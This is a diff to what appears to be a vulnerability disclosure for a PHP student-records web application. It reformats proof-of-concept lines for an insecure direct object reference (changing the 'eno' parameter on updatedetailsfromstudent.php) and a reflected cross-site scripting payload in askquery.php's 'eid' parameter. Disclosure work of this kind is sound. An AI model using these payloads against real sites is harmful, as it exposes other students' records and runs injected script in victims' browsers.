@@ -3,8 +3,9 @@
 
 IDOR
 
-updatedetailsfromstudent.php?eno=146891651#
-updatedetailsfromstudent.php?eno=146891652#
+Poc:
+- updatedetailsfromstudent.php?eno=146891651#
+- updatedetailsfromstudent.php?eno=146891652#
 
 <img width="1839" height="816" alt="image" src="https://github.com/user-attachments/assets/f6be2239-bacd-4bfc-9002-51b574cae2dc" />
 
@@ -13,8 +14,8 @@ updatedetailsfromstudent.php?eno=146891652#
 
 XSS
 
-askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
-
+Poc:
+- /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>
 
 <img width="1038" height="732" alt="image" src="https://github.com/user-attachments/assets/3c33a43b-084e-4768-8b60-ca1d8712e129" />
 
